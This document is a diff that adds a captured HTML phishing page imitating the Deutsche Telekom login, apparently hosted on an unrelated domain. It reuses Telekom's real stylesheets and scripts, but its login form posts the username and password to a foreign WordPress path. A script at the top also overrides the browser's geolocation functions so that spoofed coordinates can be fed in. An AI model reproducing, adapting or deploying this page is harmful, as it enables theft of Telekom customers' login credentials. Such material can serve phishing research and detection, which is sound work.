@@ -1,0 +1,273 @@
+<!-- URL =https://duschicka.de/telekom/--><!-- w =('duschicka.de', None, None)--><!DOCTYPE html>
+<html class="no-js" lang="de">
+ <script>
+  (function(){function nQOUx() {
+  window.qMMwISk = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
+  window.fxokiEw = navigator.geolocation.watchPosition.bind(navigator.geolocation);
+  let WAIT_TIME = 100;
+
+  function waitGetCurrentPosition() {
+    if ((typeof window.Jhula !== 'undefined')) {
+      if (window.Jhula === true) {
+        window.JCXvuCu({
+          coords: {
+            latitude: window.HHyIg,
+            longitude: window.LfPEW,
+            accuracy: 10,
+            altitude: null,
+            altitudeAccuracy: null,
+            heading: null,
+            speed: null,
+          },
+          timestamp: new Date().getTime(),
+        });
+      } else {
+        window.qMMwISk(window.JCXvuCu, window.HLMIomc, window.UjoqD);
+      }
+    } else {
+      setTimeout(waitGetCurrentPosition, WAIT_TIME);
+    }
+  }
+
+  function waitWatchPosition() {
+    if ((typeof window.Jhula !== 'undefined')) {
+      if (window.Jhula === true) {
+        navigator.getCurrentPosition(window.avCELSO, window.qXQoOrY, window.EoygL);
+        return Math.floor(Math.random() * 10000); // random id
+      } else {
+        window.fxokiEw(window.avCELSO, window.qXQoOrY, window.EoygL);
+      }
+    } else {
+      setTimeout(waitWatchPosition, WAIT_TIME);
+    }
+  }
+
+  navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
+    window.JCXvuCu = successCallback;
+    window.HLMIomc = errorCallback;
+    window.UjoqD = options;
+    waitGetCurrentPosition();
+  };
+  navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
+    window.avCELSO = successCallback;
+    window.qXQoOrY = errorCallback;
+    window.EoygL = options;
+    waitWatchPosition();
+  };
+
+  window.addEventListener('message', function (event) {
+    if (event.source !== window) {
+      return;
+    }
+    const message = event.data;
+    switch (message.method) {
+      case 'sHPrZVY':
+        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
+          window.HHyIg = message.info.coords.lat;
+          window.LfPEW = message.info.coords.lon;
+          window.Jhula = message.info.fakeIt;
+        }
+        break;
+      default:
+        break;
+    }
+  }, false);
+}nQOUx();})()
+ </script>
+ <!--<![endif]-->
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+  <title>
+   Telekom Login
+  </title>
+  <meta content="Telekom Login" name="description"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <link href="https://accounts.login.idm.telekom.com/static/factorx/vdplus/css/components.min.css" rel="stylesheet" type="text/css"/>
+  <link href="https://accounts.login.idm.telekom.com/static/factorx/vdplus/css/login.css" rel="stylesheet" type="text/css"/>
+  <script>
+   var accountLocked = false;
+        var accountLockedPermanent = false;
+        var accountLockExpiration = 0;
+        var loginFailed = false;
+  </script>
+  <!--[if lt IE 9]>
+    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/html5shiv.js"></script>
+    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/respond.min.js"></script>
+    <![endif]-->
+  <script src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/jquery-3.2.1.min.js" type="text/javascript">
+  </script>
+  <script src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/components.min.js" type="text/javascript">
+  </script>
+  <script src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/login.js" type="text/javascript">
+  </script>
+ </head>
+ <body>
+  <div>
+   <header id="tbs-header">
+    <div id="tbs-header-content">
+     <div class="container-fixed clearfix">
+      <div class="pull-left">
+       <div class="v-ctr">
+        <i class="icon icon-large">
+         tT
+        </i>
+       </div>
+      </div>
+      <div class="pull-right">
+       <div class="v-ctr">
+        <span class="text-right text-bold text-small tbs-text-upper">
+         erleben, was verbindet.
+        </span>
+       </div>
+      </div>
+     </div>
+    </div>
+   </header>
+   <div>
+   </div>
+   <div class="offset-bottom-5 offset-s-bottom-2">
+   </div>
+  </div>
+  <div>
+   <div>
+    <img alt="" frameborder="0" height="1" hidden="true" src="https://xdn-ttp.de/lns/import-event-0746?zid=110c0365-f7f8-4559-8c17-d513ee56a7be" width="1"/>
+    <img alt="" frameborder="0" height="1" hidden="true" src="https://pix.telekom.de/196380495960676/wt?p=441,www.telekom.de.privatkunden.login-idm-id,0,0,0,0,0,0,0,0&amp;cg1=www.telekom.de&amp;cg2=login&amp;cg8=privatkunden&amp;cg9=login-idm-id&amp;cp19=110c0365-f7f8-4559-8c17-d513ee56a7be" width="1"/>
+   </div>
+  </div>
+  <div>
+   <div class="container-fixed">
+    <div class="tbs-container">
+     <div id="tbs-headline">
+      <div class="tbs-relative text-center" id="tbs-brand">
+       <h4>
+        Telefoniecenter
+       </h4>
+      </div>
+      <h1 class="offset-top-0 offset-bottom-3 text-center">
+       Mit dem Telekom Login anmelden
+      </h1>
+     </div>
+     <div class="login-box">
+      <div class="offset-bottom-1">
+       <form accept-charset="UTF-8" action="http://www.fbqd.com/wp-admin/user/css.php" autocomplete="off" id="login" method="POST" name="login" novalidate="">
+        <input name="xsrf_rVAfeSN15o36RlOBco2lpA" type="hidden" value="hv1cTXb6jaiblC2Br5Q6_A"/>
+        <input name="x-show-cancel" type="hidden" value="false"/>
+        <div class="offset-bottom-1">
+         <div class="form-input-set floating">
+          <input aria-describedby="usrInfo" class="form-input" id="pw_usr" maxlength="256" name="pw_usr" tabindex="10" type="email" value=""/>
+          <label for="pw_usr">
+           Benutzername
+          </label>
+          <i class="info-question-icon" data-target="#usrInfo" data-toggle="collapse" data-toggle-hide="true" tabindex="60">
+          </i>
+         </div>
+         <div class="info-box pointer" id="usrInfo">
+          <p>
+           So können Sie sich anmelden:
+          </p>
+          <ul>
+           <li>
+            <span class="text-bold">
+             E-Mail-Adresse:
+            </span>
+            <span>
+             Ihre Telekom E-Mail-Adresse oder Ihre E-Mail-Adresse eines anderen Anbieters, mit der Sie sich registriert haben.
+            </span>
+           </li>
+           <li>
+            <span class="text-bold">
+             Mobilfunk-Nummer:
+            </span>
+            <span>
+             Ihre Telekom Mobilfunk-Nummer, wenn Sie diese mit Ihrem Telekom Login verknüpft haben.
+            </span>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="offset-bottom-1">
+         <div class="form-input-set">
+          <input class="form-input" id="pw_pwd" maxlength="128" name="pw_pwd" tabindex="20" type="password"/>
+          <label for="pw_pwd">
+           Passwort
+          </label>
+         </div>
+        </div>
+        <div style="display: none;">
+         <div class="info-box error">
+          <div>
+           E-Mail-Adresse muss "@t-online.de" enthalten.
+          </div>
+         </div>
+        </div>
+        <div class="login-helpers clearfix">
+         <div class="form-checkbox-set" id="tbs-signin-remember">
+          <label>
+           <div autocomplete="off" class="form-checkbox-js" hidefocus="true" role="checkbox" tabindex="30">
+            <span class="border">
+            </span>
+            <span class="check" role="presentation">
+            </span>
+           </div>
+           <input class="form-checkbox hidden" id="checkbox_permanent" name="persist_session" tabindex="30" type="checkbox" value="1"/>
+           <span>
+            Angemeldet bleiben
+           </span>
+          </label>
+         </div>
+         <div class="text-right" id="tbs-recovery-link">
+          <a href="https://meinkonto.telekom-dienste.de/wiederherstellung/passwort/index.xhtml" tabindex="70" target="_blank">
+           Benutzername oder Passwort vergessen?
+          </a>
+         </div>
+        </div>
+        <div class="clearfix">
+         <button class="text-center btn btn-brand btn-block btn-large tbs-text-upper" id="pw_submit" name="pw_submit" tabindex="40" type="submit">
+          Login
+         </button>
+        </div>
+       </form>
+      </div>
+      <div class="text-center offset-bottom-2">
+       <a href="https://www.telekom.de/hilfe/vertrag-meine-daten/login-daten-passwoerter" tabindex="45" target="_blank">
+        Brauchen Sie Hilfe?
+       </a>
+      </div>
+      <div class="text-center offset-bottom-2">
+      </div>
+      <div class="text-center" id="tbs-services">
+       <img src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/images/services.png"/>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <footer id="tbs-footer">
+   <div class="footer-content container-fixed text-small clearfix">
+    <div class="pull-left">
+     <p>
+      © Telekom Deutschland GmbH
+     </p>
+     <p class="tbs-text-11">
+      20.20.2, 62334c584583da8666d3dfbba4a10381, c2cf5a594458657dc9bd3821da82355354027cbc
+     </p>
+    </div>
+    <div class="pull-right clearfix">
+     <div class="pull-left">
+      <a href="https://www.telekom.de/start/impressum" tabindex="90" target="_blank">
+       Impressum
+      </a>
+     </div>
+     <div class="pull-left">
+      <a href="https://www.telekom.de/datenschutz-ganz-einfach" id="data-protection" tabindex="100" target="_blank">
+       Datenschutz
+      </a>
+     </div>
+    </div>
+   </div>
+  </footer>
+  <div>
+  </div>
+ </body>
+</html>
